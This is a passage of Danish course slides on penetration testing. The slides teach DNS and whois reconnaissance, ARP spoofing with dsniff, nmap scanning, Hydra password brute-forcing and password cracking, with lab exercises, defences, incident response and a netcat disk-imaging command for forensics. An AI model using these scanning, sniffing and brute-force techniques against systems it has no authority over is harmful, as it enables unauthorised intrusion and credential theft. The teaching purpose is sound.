#! /bin/sh
# Try to get version info from BIND server
PROGRAM=`basename $0`
. `dirname $0`/functions.sh
if [ $# -ne 1 ]; then
   echo "get name server version, need a target! "
   echo "Usage: $0 target"
   echo "example $0 10.1.2.3"
   exit 0
fi
TARGET=$1
# using dig 
start_time
dig @$1 version.bind chaos txt
echo Authors BIND er i versionerne 9.1 og 9.2 - måske ...
dig @$1 authors.bind chaos txt
stop_time
\end{alltt}
\centerline{\link{http://www.kramse.dk/files/tools/dns/bind-version}}

\slide{Små DNS tools dns-timecheck - Perl script}

\begin{alltt}\small
#!/usr/bin/perl
# modified from original by Henrik Kramshøj, hlk@kramse.dk
# 2004-08-19
#
# Original from: http://www.rfc.se/fpdns/timecheck.html
use Net::DNS;

my $resolver = Net::DNS::Resolver->new;
$resolver->nameservers($ARGV[0]);

my $query = Net::DNS::Packet->new;
$query->sign_tsig("n","test");

my $response = $resolver->send($query);
foreach my $rr ($response->additional) {
  print "localtime vs nameserver $ARGV[0] time difference: ";
  print$rr->time_signed - time() if $rr->type eq "TSIG";
}  
\end{alltt}
% inserting stupid $ to stop EMACS from
\centerline{\link{http://www.kramse.dk/files/tools/dns/dns-timecheck}}

\slide{Google for it}

\hlkimage{18cm}{images/googledorks-1.pdf}

\begin{list1}
\item Google som hacker værktøj?
\item Googledorks
\link{http://johnny.ihackstuff.com/}
\end{list1}


% opgaver session 1-4
\slide{Opgave: whois databaser}
\label{ex:whois}

{\bfseries Opgave:} 

Lær at bruge whois 

{\bfseries Forslag til fremgangsmåde:} 

Login på UNIX server - læs manualen til programmet whois

eller brug webinterface på \link{http://www.ripe.net}

{\bfseries Hjælp:} 

Whois databaserne er fordelt på ARIN, RIPE, LACNIC, AfriNIC og APNIC

Kommandoen {\bfseries whois -r 217.157.20.129} vil på en OpenBSD give
svaret på et opslag i RIPE databasen efter IP adresse 217.157.20.129

{\bfseries Diskussion:} 

I skal lære at spørge efter IP adresser og spore oprindelsen - find
eksempelvis brugeren af IP-adressen 217.157.20.131

\slide{Opgave: navneopslag}

{\bfseries Opgave:}
Prøv forskellige programmer til at spørge en service

{\bfseries Forslag til fremgangsmåde:}
\begin{list2}
\item nslookup - findes både på UNIX og Windows
\item Prøv nslookup -q=txt -class=CHAOS version.bind. 0  
\item dig - syntaks @server domain query-type query-class
\item host - syntaks host [-l] [-v] [-w] [-r] [-d] [-t querytype] [-a] host [server]
\item prøv {\bfseries host -a security6.net} \\
{\bfseries host -a www.security6.net} - hvad er forskellen 
    \end{list2}

{\bfseries Hjælp:}\\ 
Hvad er en zonetransfer? det er alle de records der er defineret for
et domæne

Hvad er forward og reverse lookup? forward er fra hostnavn til IP adresse,
mens reverse er fra IP adresse til hostnavn 


\slide{Opgave: lær at bruge host programmet}

\label{ex:whois}

{\bfseries Opgave:} 

Brug host programmet til at finde den autoritative
navneserver for et domæne

{\bfseries Forslag til fremgangsmåde:} 

Login på UNIX server - kør programmet med en DNS server som I kender
eller den autoritative for security6.net domænet

{\bfseries Hjælp:} 

\begin{alltt}
$ host -t ns security6.net
security6.net name server ns1.security6.net.
security6.net name server ns6.gandi.net.  
$ host -t ns security6.net 217.157.20.131
...
\end{alltt}
{\bfseries Diskussion:} 



\slide{Opgave: afprøv bind-version programmet}
\label{ex:whois}

{\bfseries Opgave:} 

Lær at bruge et shell script på UNIX

Hint: \verb+#!+ i starten angiver at det
er program og med x-bitten sat virker scripts som alle andre programmer

{\bfseries Forslag til fremgangsmåde:} 

Login på UNIX server - kør programmet med en DNS server som I kender
eller den autoritative for security6.net domænet

{\bfseries Hjælp:} 

UNIX shell scripting findes i flere varianter. O'Reilly bogen
\emph{Classic shellscripting} anbefales


{\bfseries Diskussion:} 

\slide{Opgave: afprøv dns-timecheck programmet}
\label{ex:whois}

{\bfseries Opgave:} 

Lær at bruge et Perl program

Hint: \verb+#!+ i starten angiver at det
er program og med x-bitten sat virker scripts som alle andre programmer

{\bfseries Forslag til fremgangsmåde:} 

Login på UNIX server - kør programmet med en DNS server som I kender
eller den autoritative for .se TLD

{\bfseries Hjælp:} 

Perl kan være svært at gå til - der findes dog gode tutorials og
O'Reilly bøgerne kan varmt anbefales

{\bfseries Diskussion:} 

Hvad er fordele og ulemper ved Perl programmet i forhold til shell-scriptet

%session 1-5

\slide{Hvordan virker ARP?}

\begin{center}
\colorbox{white}{\includegraphics[width=18cm]{images/arp-basic.pdf}}  
\end{center}

%server 00:30:65:22:94:a1\\
%client 00:40:70:12:95:1c\\
%hacker 00:02:03:04:05:06\\

\slide{Hvordan virker ARP? - 2}
\begin{list1}
\item {\bfseries ping 10.0.0.2} udført på server medfører
\item ARP Address Resolution Protocol request/reply:
  \begin{list2}
  \item ARP request i broadcast - Who has 10.0.0.2 Tell 10.0.0.1
  \item ARP reply (fra 10.0.0.2) 10.0.0.2 is at 00:40:70:12:95:1c
  \end{list2}
\item IP ICMP request/reply:
  \begin{list2}
    \item Echo (ping) request fra 10.0.0.1 til 10.0.0.2
\item Echo (ping) reply fra 10.0.0.2 til 10.0.0.1
\item ...
  \end{list2}
\item ARP udføres altid på Ethernet før der kan sendes IP trafik
\item (kan være RARP til udstyr der henter en adresse ved boot)
\end{list1}


\slide{Hvordan virker ARP spoofing?}

\begin{center}
\colorbox{white}{\includegraphics[width=15cm]{images/arp-spoof.pdf}}  
\end{center}

\begin{list1}
\item Hackeren sender forfalskede ARP pakker til de to parter
\item De sender derefter pakkerne ud på Ethernet med hackerens MAC
  adresse som modtager - han får alle pakkerne
\end{list1}

\slide{Forsvar mod ARP spoofing}

\begin{list1}
\item Hvad kan man gøre? 
\item låse MAC adresser til porte på switche
\item låse MAC adresser til bestemte IP adresser
\item Efterfølgende administration!
\vskip 1 cm
\item {\bfseries arpwatch er et godt bud} - overvåger ARP
\item bruge protokoller som ikke er sårbare overfor opsamling
\end{list1}


\slide{FTP}
\begin{list1}
\item File Transfer Protocol - filoverførsler
\item Trivial File Transfer Protocol - uautentificerede filoverførsler
\item De bruges især til:
  \begin{list2}
    \item FTP - drivere, dokumenter, rettelser - Windows Update? er
    enten HTTP eller FTP
\item TFTP bruges til boot af netværksklienter uden egen harddisk
  \end{list2}
\item FTP sender i klartekst\\ 
{\bfseries USER brugernavn} og \\
{\bfseries PASS hemmeligt-kodeord} 
\end{list1}

\slide{POP3 - e-mail i Danmark}

\vskip 1 cm

\begin{list1}
  \item POP3 sender brugernavn og kodeord i klartekst - ligesom FTP
\item bruges dagligt af næsten alle privatkunder
\item  alle internetudbydere og postudbydere tilbyder POP3
\item der findes en variant, POP3 over SSL/TLS
\end{list1}



\slide{dsniff}

\begin{list1}
\item en sniffer til mange usikre protokoller
\item inkluderer {\bfseries arpspoof}  
\item Lavet af Dug Song, dugsong@monkey.org
\end{list1}

\begin{alltt}
dsniff  is  a  password sniffer which handles FTP, Telnet,
SMTP, HTTP, POP, poppass, NNTP, IMAP, SNMP, LDAP,  Rlogin,
RIP,  OSPF,  PPTP  MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11,
CVS, IRC, AIM, ICQ, Napster,  PostgreSQL,  Meeting  Maker,
Citrix  ICA,  Symantec  pcAnywhere, NAI Sniffer, Microsoft
SMB, Oracle SQL*Net, Sybase and Microsoft SQL protocols.
\end{alltt}

\slide{dsniff forudsætninger}

\begin{list1}
\item Der er visse forudsætninger der skal være opfyldt
  \begin{list2}
\item Man skal have trafikken
\item Det kan gøres gennem arp spoofing eller ved at hacke ind i et
  system/router på netværksvejen
\end{list2}
\end{list1}

\begin{center}
  \colorbox{white}{\includegraphics[width=12cm]{images/arp-spoof.pdf}}  
\end{center}

\slide{Kommenteret dsniff}

\hlkimage{22cm}{images/dsniff-comments.pdf}


\slide{netværksdesign og sikkerhed}

\begin{list1}
  \item Hvad kan man gøre for at få bedre netværkssikkerhed?
    \begin{list2}
    \item bruge switche - der skal ARP spoofes og bedre performance
    \item opdele med firewall til flere DMZ zoner for at holde
      udsatte servere adskilt fra hinanden, det interne netværk og
      Internet
    \item overvåge, læse logs og reagere på hændelser 
    \end{list2}
\end{list1}

\slide{basalt netværk}

\begin{center}
\colorbox{white}{\includegraphics[width=20cm]{images/security6-net.pdf}}  
\end{center}


\slide{Intrusion Detection Systems - IDS}

\begin{list1}
  \item angrebsværktøjerne efterlader spor

\item hostbased IDS - kører lokalt på et system og forsøger at
  detektere om der er en angriber inde
\item network based IDS - NIDS - bruger netværket
\item Automatiserer netværksovervågning:
  \begin{list2}
  \item bestemte pakker kan opfattes som en signatur
\item analyse af netværkstrafik - FØR angreb
\item analyse af netværk under angreb - sender en alarm
  \end{list2}
\item \link{http://www.snort.org} - det kan anbefales at se på Snort
\end{list1}

\slide{Ulemper ved IDS}

\hlkimage{5cm}{images/snort_tm.png}

\begin{list1}
\item snort er baseret på signaturer
\item mange falske alarmer - tuning og vedligehold
\item hvordan sikrer man sig at man har opdaterede signaturer for
  angreb som går verden rundt på et døgn 
\end{list1}

\slide{Honeypots - ressourcekrævende?}

\begin{list1}
\item \emph{The Use of Honeynets to Detect Exploited Systems
Across Large Enterprise Networks}
\begin{quote}
\small
"There are 69 separate departments at Georgia Tech with between 30,000-35,000
networked computers installed on campus."
...
"In the six months that we have been running the Georgia
Tech Honeynet {\bfseries we have detected 16 compromised
Georgia Tech systems on networks} other than our
Honeynet. These compromises include automated worm
type exploits as well as individual systems that have been
targeted and compromised by hackers."
\end{quote}

\item Honeypots og IDS systemer kan være ressourcekrævende, men
en kombination kan være mere effektiv i visse tilfælde

\item Kilde:
\link{http://www.tracking-hackers.com/papers/gatech-honeynet.pdf}  
\end{list1}


\slide{TCP sequence number prediction}

\begin{list1}
  \item tidligere baserede man ofte login og adgange på de IP adresser
  som folk kom fra
\item det er ikke pålideligt at tro på address based authentication
\item TCP sequence number kan måske gættes
\item Mest kendt er nok Shimomura der blev hacket på den måde, måske
  af Kevin D Mitnick eller en kompagnon
\end{list1}

% opgaver session 1-5

\slide{Opgave: Kig på arpspoof og dsniff}

{\bfseries Opgave:} \\
Læs om arpspoof og dsniff - prøv dem gerne

{\bfseries Forslag til fremgangsmåde:} \\
Log på UNIX systemet - skriv {\bfseries man arpspoof} og
{\bfseries man dsniff}

{\bfseries Hjælp:} \\
Hvad kræver programmerne som input?

ARP spoof lyver om relationen mellem hardware adresser og IP adresser
til de systemer der skal overvåges. Dsniff afkoder trafikken som er
dirigeret til systemet.

{\bfseries Diskussion:}\\ 
Hvilke muligheder er der med disse programmer?

% session 1-6
% basal portscanning og intro til cd-rom
\slide{Basal Portscanning}

\begin{list1}
  \item Hvad er portscanning
\item afprøvning af alle porte fra 0/1 og op til 65535
\item målet er at identificere åbne porte - sårbare services
\item typisk TCP og UDP scanning
\item TCP scanning er ofte mere pålidelig end UDP scanning
\end{list1}

{\hlkbig TCP handshake er nemmere at identificere

UDP applikationer svarer forskelligt - hvis overhovedet}

\slide{TCP three way handshake}

\hlkimage{7cm}{images/tcp-three-way.pdf}

\begin{list2}
\item {\bfseries TCP SYN half-open} scans
\item Tidligere loggede systemer kun når der var etableret en fuld TCP
  forbindelse - dette kan/kunne udnyttes til \emph{stealth}-scans
\item Hvis en maskine modtager mange SYN pakker kan dette fylde
  tabellen over connections op - og derved afholde nye forbindelser
  fra at blive oprette - {\bfseries SYN-flooding}
\end{list2}


\slide{Ping og port sweep}

\begin{list1}
\item scanninger på tværs af netværk kaldes for sweeps 
\item Scan et netværk efter aktive systemer med PING
\item Scan et netværk efter systemer med en bestemt port åben
\item Er som regel nemt at opdage:
  \begin{list2}
    \item konfigurer en maskine med to IP-adresser som ikke er i brug
\item hvis der kommer trafik til den ene eller anden er det portscan
\item hvis der kommer trafik til begge IP-adresser er der nok
  foretaget et sweep - bedre hvis de to adresser ligger et stykke fra hinanden
  \end{list2}

\end{list1}

\slide{nmap port sweep efter port 80/TCP}

\begin{list1}
  \item Port 80 TCP er webservere
\end{list1}

\begin{alltt}
\small # {\bfseries nmap  -p 80 217.157.20.130/28}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (217.157.20.129):
Port       State       Service
80/tcp     filtered    http                    

Interesting ports on www.kramse.dk (217.157.20.131):
Port       State       Service
80/tcp     open        http                    

Interesting ports on  (217.157.20.139):
Port       State       Service
80/tcp     open        http                    

\end{alltt}

\slide{nmap port sweep efter port 161/UDP}

\begin{list1}
  \item Port 161 UDP er SNMP
\end{list1}

\begin{alltt}  
\small # {\bfseries nmap -sU -p 161 217.157.20.130/28}

Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
Interesting ports on router.kramse.dk (217.157.20.129):
Port       State       Service
161/udp    open        snmp                    

The 1 scanned port on mail.kramse.dk (217.157.20.130) is: closed

Interesting ports on www.kramse.dk (217.157.20.131):
Port       State       Service
161/udp    open        snmp                    

The 1 scanned port on  (217.157.20.132) is: closed
\end{alltt}

\slide{OS detection}
\begin{alltt}
\footnotesize
# nmap -O ip.adresse.slet.tet \emph{scan af en gateway}
Starting nmap 3.48 ( http://www.insecure.org/nmap/ ) at 2003-12-03 11:31 CET
Interesting ports on gw-int.security6.net (ip.adresse.slet.tet):
(The 1653 ports scanned but not shown below are in state: closed)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1080/tcp open  socks
5000/tcp open  UPnP
Device type: general purpose
Running: FreeBSD 4.X
OS details: FreeBSD 4.8-STABLE
Uptime 21.178 days (since Wed Nov 12 07:14:49 2003)
Nmap run completed -- 1 IP address (1 host up) scanned in 7.540 seconds
\end{alltt}

\begin{list2}
  \item lavniveau måde at identificere operativsystemer på
\item send pakker med \emph{anderledes} indhold
\item Reference: \emph{ICMP Usage In Scanning} Version 3.0,
  Ofir Arkin\\ \link{http://www.sys-security.com/html/projects/icmp.html}
\end{list2}

% opgaver session 1-6 

\slide{Opgave: Find maskiner}


{\bfseries Opgave:}\\ 
Log på UNIX og brug nmap til at søge efter maskiner på lokalnetværket

{\bfseries Forslag til fremgangsmåde:}\\ 
Lav forskellige typer scan og
inddel resultaterne efter:
\begin{list2}
\item aktive systemer
\item åbne porte/services
\end{list2}

{\bfseries Hjælp:} \\
Prøv med Nmap port sweep 

{\bfseries Diskussion:}\ 
Er det noget som foregår på Internet?


\slide{Opgave: nmap portscanning}
\label{ex:nmap}

{\bfseries Opgave:} \\
Brug nmap til at finde åbne porte på netværket

{\bfseries Forslag til fremgangsmåde:}\\ 
Brug \verb+nmap -p 1-1024 server+ til at scanne de første 1024 TCP
porte på en server
Brug \verb+nmap -sU+ til at scanne efter UDP porte og \verb+-P0+
option til at undgå at sende ping først

{\bfseries Hjælp:} \\
Eksempel: \verb+nmap -P0 -sU -p1-1024 server+ UDP portscanning af port
1-1024 uden ping først

{\bfseries Diskussion:}\\ 
TCP og UDP portscanning er meget forskelligt. TCP er
forbindelsesorienteret og har session setup i form af en three-way
handshake som gør at en client først sender TCP-SYN, server svarer med 
TCP-SYN+ACK og derefter etableres forbindelsen endeligt med TCP-ACK fra
klienten. UDP er forbindelsesløs kommunikation og der er ingen session
setup - derfor er UDP scanning mere upålideligt.

\slide{Opgave: nmap servicescanning}
\label{ex:nmap-service}

{\bfseries Opgave:} \\
Brug nmap service detection til at finde ud af hvilke services der
gemmes sig bagved de åbne porte på netværket

{\bfseries Forslag til fremgangsmåde:}\\ 
Brug \verb+nmap -A+ option til at slå service detection til

{\bfseries Hjælp:} \\
Kig på manual siden til nmap

{\bfseries Diskussion:}\\ 
Hvordan finder man ud af hvilken protokol der ligger bagved en port?


\slide{Opgave: nmap OS detection}
\label{ex:nmap-os}

{\bfseries Opgave:} \\
Brug nmap OS detection til at finde operativsystemerne på netværket

{\bfseries Forslag til fremgangsmåde:}\\ 
Find listen med aktive systemer fra tidligere (eller lav sweeps)
kig på manualsiderne {\bfseries man nmap} 
udfør OS detection på de fundne maskiner

{\bfseries Hjælp:} \\
Brug \verb+nmap -O+ option til at slå OS detection til

Nmap portscanneren kan sende specielle pakker og dermed udlede hvilket
operativsystem der gemmer sig - udfra de svar der kommer retur
 
{\bfseries Diskussion:}\\ 
Nmap OS detection er ikke altid lige præcis - det hjælper hvis der
angives både en åben og en lukket port - hvorfor?
og {\bfseries man xprobe}

\slide{Opgave: pentest cd-rom}
\label{ex:fire-1}

{\bfseries Opgave:}\\ 
Brug den udleverede cd-rom til at foretage en mini-pentest med
portscanning fra et tilfældigt system

{\bfseries Forslag til fremgangsmåde:}\\ 
boot cd-rom, indlæs driver til
netkortet, start DHCP klient, foretag portscanning med nmap

{\bfseries Hjælp:} \\
Mange bootbare cd-rom distributioner er baseret på Linux og der kan
indlæses moduler til kernen - og dermed er de fleste hardware enheder
på almindelige pc-systemer dækket ind.

{\bfseries Diskussion:}\\ 
Cd-rom kan også bruges til computer forensics - hvis man står med en
kompromitteret server.


% afslutning dag 1
\slide{Erfaringer hidtil}

\begin{list1}
  \item mange oplysninger
\item kan man stykke oplysningerne sammen kan man sige en hel del om
  netværket 
\item en skabelon til registrering af maskiner er god
  \begin{list2}
    \item svarer på ICMP: $\Box$\  echo, $\Box$\ mask, $\Box$\ time
\item svarer på traceroute: $\Box$\ ICMP, $\Box$\ UDP
\item Åbne porte TCP og UDP: 
\item Operativsystem:
\item ... (banner information m.v.)
  \end{list2}
\item Mange små pakker kan oversvømme store forbindelser og
  give problemer for netværk
\end{list1}


\slide{Vurdering af produkter}

\begin{list1}
\item Pentesting er ikke kun til test af produktionsnetværk
\item man skal ofte vurdere nye produkter - sikkerhedsmæssigt og
  funktionalitetsmæssigt - yder det beskyttelse, forbedrer det
  sikkerheden m.v.
\end{list1}

\slide{Hvad er værdien af pentest?}

\begin{list1}
\item hvor og hvordan kan I bruge penetrationstest
\item hvis man vil have et andet indblik i netværket, TCP, UDP, ICMP,
  portscannning og samle puslespil udfra få informationer 
\item Netværksadministratorer kan bruge pentesting til at sikre egne
  netværk ved brug af samme teknikker som hackere
\item IT-/sikkerheds-chef vurdere og evaluere tilbud og løsninger for
  sikkerheden. Er den påtænkte løsning fornuftig?
\item Man står med en server der er kompromitteret - hvordan skete
  det? - hvordan forhindrer vi det en anden gang. 
\end{list1}



% dag 2
% session 2-1



\slide{Simple Network Management Protocol}

\begin{list1}
\item SNMP er en protokol der supporteres af de fleste professionelle
  netværksenheder, såsom switche, routere
\item hosts - skal slås til men følger som regel med
\item SNMP bruges til: 
  \begin{list2}
    \item \emph{network management}
    \item statistik
    \item rapportering af fejl - SNMP traps
  \end{list2}
\item {\bfseries sikkerheden baseres på community strings der sendes
    som klartekst ...}
\item det er nemmere at brute-force en community string end en
  brugerid/kodeord kombination
\end{list1}

\slide{brute force}

\begin{list1}
\item hvad betyder bruteforcing?\\
afprøvning af alle mulighederne
\end{list1}

\begin{alltt}
\small
Hydra v2.5 (c) 2003 by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] 
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME] 
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...  
\end{alltt}

\slide{Routing}

\vskip 1 cm

\begin{list1}
  \item routing table - tabel over netværkskort og tilhørende adresser
\item default gateway - den adresse hvortil man sender
  \emph{non-local} pakker\\kaldes også default route, gateway of last
  resort
\item routing styres enten manuelt - opdatering af route tabellen,
  eller konfiguration af adresser og subnet maske på netkort
\item eller automatisk ved brug af routing protocols - interne og
  eksterne route protokoller
\item de lidt ældre routing protokoller har ingen sikkerhedsmekanismer
\end{list1}

\slide{Source routing}

\begin{list1}
\item source routing - mulighed for at specificere en ønsket vej for
  pakken
 
  \item Hvis en angriber kan fortælle hvilken vej en pakke skal følge
  kan det give anledning til sikkerhedsproblemer
\item maskiner idag bør ikke lytte til source routing, evt. skal de
  droppe pakkerne
\end{list1}

\slide{Angreb mod routing}

\begin{list1}
  \item falske routing updates til protokollerne
\item sende redirect til maskiner

\item Der findes (igen) specialiserede programmer til at teste og
  forfalske routing updates, svarende til icmpush programmet
\item Det anbefales at sikre routere bedst muligt - eksempelvis 
Secure IOS template der findes på adressen:\\
\link{http://www.cymru.com/Documents/secure-ios-template.html}
\end{list1}



%\slide{Hvad siger standarderne}



%\slide{Denial of service}

%flooding, stahlendract osv.
%kig efter dos script
%fischer:/Volumes/Userdata/backup/carlton/usr/tools/*dos

\slide{Incidents.org}

\hlkimage{9cm}{images/incidents-january.png}  

\begin{list1}
  \item \link{www.incidents.org} følger hele tiden med i angreb
- man kan selv hente software og bidrage med logs
\end{list1}

\slide{Hvordan ser en orm ud på nettet?}

\hlkimage{18cm}{images/sqlworm-matrix.png}  

\begin{center}
Internet statistik fra januar - SQL Sapphire/Slammer ormen\\
Kilde: 
\link{http://average.matrix.net/Daily/markR.html}
\end{center}

%\slide{Incident management}

%input fra forensics præsentationen, ref til dette kursus

%sikkerhedsstandarder BS7799 og DS-484

\slide{Hændelseshåndtering}

\hlkimage{13cm}{images/virksomhedens-netvaerk.pdf}
\begin{list1}
\item Du VIL komme ud for hændelser, man kan ikke regne med at
sikkerhedsforanstaltninger altid virker
\item Der er hændelser - men opdager I dem?
  \begin{list2}
  \item Der ER sket en hændelse - håndterer I den effektivt? - hvad er
    forøvrigt optimalt? Lav en plan for håndtering af hændelser
  \end{list2}
\end{list1}

\slide{Hændelseshåndtering - en metode}

\begin{list1}
\item Vær forberedt på at håndtere hændelser!
\item Incident Response, E. Eugene Schultz og Russel Shumway foreslår: 
  \begin{list2}
    \item Preparation - forberedelse lær at snakke med politiet, hav
    kontaktinformation på plads, mobiltelefonnumre m.v.
\item Detection - man opdager, her kan integritetscheckere og IDS hjælpe
\item Containment - indkapsling, undgå spredning til andre systemer
\item Eradication - udryddelse af problemet, eventuelt reinstallation
  af systemer
\item Recovery - sæt systemerne i produktion igen
\item Follow-up - undgå det sker igen, opsamling af statistik om hændelser
  \end{list2}

\item \emph{ Incident Response: A Strategic Guide to Handling System
 and Network Security Breaches} 
 af E. Eugene, Dr Schultz, Russell Shumway, Que, 2002
\end{list1}


\slide{Hændelseshåndtering - værktøjer}

%\hlkimage{8cm}{images/FIRE-logo.jpg}

\begin{list1}
\item Forensics er retsmedicin, og med informationssystemer og servere
  er det analyse af IT systemer og data.
\item Nogle data findes i hukommelsen på systemerne, andre kan læses
  fra hardiske, disketter eller andre medier  
efterfølgende kan man analysere med værktøjer som:
  \begin{list2}
\item \link{http://sourceforge.net/projects/biatchux/} og
  \link{http://biatchux.dmzs.com/} - en cd-rom der indeholder en 
  bootable Linux del. Kaldes også F.I.R.E. Forensic and Incident
  Response Environment Bootable CD
  \item TASK og Autopsy hentes på \link{http://www.sleuthkit.org}
  \end{list2}
\item Bogen \emph{Computer Forensics: Incident Response Essentials} af
  Warren G. Kruse og Jay G. Heiser er en god introduktion
\end{list1}


\slide{Kommandoer til FIRE og netcat}

\hlkimage{16cm}{images/forensics-fire-netcat}

\begin{list2}
\item Opsamling af harddisk images med F.I.R.E kan foretages således
\item find harddisken og partionerne med \verb+fdisk+ programmet,
  eller se på \verb+/etc/fstab+ på UNIX
\item victim: \verb+dd if=/dev/hdd1 | nc 192.168.0.1 1234+
\item analyse-server: \verb+nc -l 1234 > image.hdd1.dd+ 
%\item \link{http://sourceforge.net/projects/biatchux/} og
%  \link{http://biatchux.dmzs.com/}
\end{list2}



\slide{ISC BIND}

\begin{list1}
\item Den mest benyttede navneserver på Internet er BIND
\item Der findes alternativer, men ingen har samme funktionalitet
\item \link{http://www.isc.org} er adressen til ISC - Internet
  Software Consortium  
\item konfigurationsfilen er {\bfseries named.conf} - for version 8 og 9

\item \link{http://www.dnsreport.com} er adressen til et godt sted at
  teste DNS for domæner
\end{list1}



\slide{BIND sårbarheder}

\begin{list1}
\item Navneservere er tit under angreb, hvorfor?!
  \begin{list2}
  \item Står på netværk med god forbindelse
  \item Har kendte adresser
  \item Kører oftest ISC BIND
  \item BIND har mange funktioner - mange fejl
  \item Den der kontrollerer navneservere kan omdirigere trafik
  \end{list2}
\end{list1}


\slide{RIPE NSD navneserver}

\begin{list1}
\item RIPE skiftede software på deres navneserver væk fra BIND og til
  en ny DNS implementation NSD 
\item Den navneserver som RIPE bestyrer hedder K
\item Er det en fordel? hvorfor?
\end{list1}











% opgaver session 2-1
\slide{Opgave: find systemer med SNMP}


{\bfseries Opgave:}\\ 
Find SNMP  systemer

{\bfseries Forslag til fremgangsmåde:} \\
Log på UNIX og brug nmap til at finde systemer med SNMP - kan være
svært ... det er UDP 161 

{\bfseries Hjælp:} \\
Når I finder en IP så prøv at bruge {\bfseries snmpwalk}
  programmet - det kan vise alle tilgængelige SNMP oplysninger fra den
  pågældende host 

\begin{list2}
\item Prøv først {\bfseries snmpwalk -v 2c -c public 10.0.43.12}\\
bør give en masse information om den pågældende netværksenhed
\end{list2}

{\bfseries Diskussion:}\\ 
Det kan være en af måderne at identificere uautoriserede WLAN
  Access Points på - sweep efter port 161/UDP på egne netværk

\slide{Opgave: Afprøv Hydra bruteforce}

{\bfseries Opgave:}\\ 
Afprøv bruteforceprogrammet hydra/Xhydra

{\bfseries Forslag til fremgangsmåde:} \\
Log på UNIX server eller brug CD'en

Lav en kort liste med passwords og brug hydra til at bruteforce
systemer

{\bfseries Hjælp:} \\
Prøv først almindeligt login - så I kan forvisse jer om at
 servicen findes og et login virker

lav derefter en liste med passwords der indeholder det rigtige


{\bfseries Diskussion:}\\ 
Der er mange options, men hydra er ikke så slem endda - den grafiske
brugergrænseflade hjælper også



\slide{NT hashes}

\begin{list1}
  \item NT LAN manager hash værdier er noget man typisk kan samle op i
  netværk 
\item det er en hash værdi af et password som man ikke burde kunne
  bruge til noget - hash algoritmer er envejs
\item opbygningen gør at man kan forsøge brute-force på 7 tegn ad
  gangen!
\item en moderne pc med l0phtcrack kan nemt knække de fleste password
  på få dage!
\item og sikkert 25-30\% indenfor den første dag - hvis der ingen
  politik er omkring kodeord! 
\item ved at generere store tabeller, eksempelvis 100GB kan man dække
  mange hashværdier af passwords med almindelige bogstaver, tal og
  tegn - og derved knække passwordshashes på sekunder. Søg efter
  rainbowcrack med google
\end{list1}

\slide{l0phtcrack LC4}
\begin{center}
\colorbox{white}{\includegraphics[width=10cm]{images/lc4_splash.png}}  
\end{center}

\begin{alltt}
\small
Consider that at one of the largest technology companies, where policy
required that passwords exceed 8 characters, mix cases, and include
numbers or symbols...   
        
L0phtCrack obtained 18\% of the passwords in 10 minutes         
90\% of the passwords were recovered within 48 hours on a Pentium II/300           
The Administrator and most Domain Admin passwords were cracked 
\link{http://www.atstake.com/research/lc/}
\end{alltt}

\slide{Cain og Abel}

%\hlkimage{10cm}{cain_brute_attack.jpg}
\hlkimage{20cm}{cain_win.jpg}

\begin{list1}
\item  Cain og Abel anbefales ofte istedet for l0phtcrack
  \link{http://www.oxid.it}
\end{list1}

\slide{John the ripper}

\begin{quote}
John the Ripper is a fast password cracker, currently available for
many flavors of Unix (11 are officially supported, not counting
different architectures), Windows, DOS, BeOS, and OpenVMS. Its primary
purpose is to detect weak Unix passwords. Besides several crypt(3)
password hash types most commonly found on various Unix flavors,
supported out of the box are Kerberos AFS and Windows NT/2000/XP/2003
LM hashes, plus several more with contributed patches.   
\end{quote}

\begin{list1}
\item UNIX passwords kan knækkes med alec Muffets kendte Crack program
  eller eksempelvis John The Ripper \link{http://www.openwall.com/john/}  
\end{list1}

\slide{kryptering, PGP og SSL/TLS}

\begin{list1}
  \item kryptering er den eneste måde at sikre:
    \begin{list2}
      \item fortrolighed
      \item autenticitet
    \end{list2}
\item kryptering består af:
  \begin{list2}
    \item Algoritmer - eksempelvis RSA
    \item \emph{protokoller} - måden de bruges på
\item programmer - eksempelvis PGP
\end{list2}
\item fejl eller sårbarheder i en af komponenterne kan formindske
  sikkerheden  
\item PGP = mail sikkerhed, se eksempelvis Enigmail plugin til Mozilla Thunderbird
\item Secure Sockets Layer SSL / Transport Layer Services TLS =
  webservere og klienter
\end{list1}


\slide{DES, Triple DES og AES/Rijndael}

%\hlkimage{15cm}{images/AES_head.png}

\begin{list1}
\item DES kryptering baseret på den IBM udviklede Lucifer algoritme
  har været benyttet gennem mange år. 
\item Der er vedtaget en ny standard algoritme Advanced Encryption
  Standard (AES) som afløser Data Encryption Standard (DES)
\item Algoritmen hedder Rijndael og er udviklet
af Joan Daemen og Vincent Rijmen.
%\item \emph{Rijndael is available for free. You can use it for
%whatever purposes  you want, irrespective of whether
%it is accepted as AES or not.}
\item Kilder:
\link{http://csrc.nist.gov/encryption/aes/} - AES Homepage\\
\link{http://www.esat.kuleuven.ac.be/~rijmen/rijndael/} - The Rijndael Page
\end{list1}


\slide{Windows RPC CVE-2003-0352} 

\begin{list1}
\item Hackergruppe "Last Stage of Delirium" finder sårbarhed i RPC
\item Den 27. juni 2003skrev LSD til Microsoft om fejlen
\begin{list2}
  

\item Microsoft har frigivet rettelser i juli 2003. 
\item LSD har ry for at arbejde seriøst sammen med
produkt-leverandørerne. De kommunikerer sårbarheder til
leverandørerne og frigiver ikke "exploit-programmer" før
leverandørerne har fået en fair chance til at løse deres
problemer. 

\item Beskrivelse af sårbarheden kan findes hos Microsoft på:\\
\link{http://microsoft.com/technet/treeview/default.asp?url=/technet/security/bulletin/MS03-026.asp}
\end{list2}
\item Kilder:\\
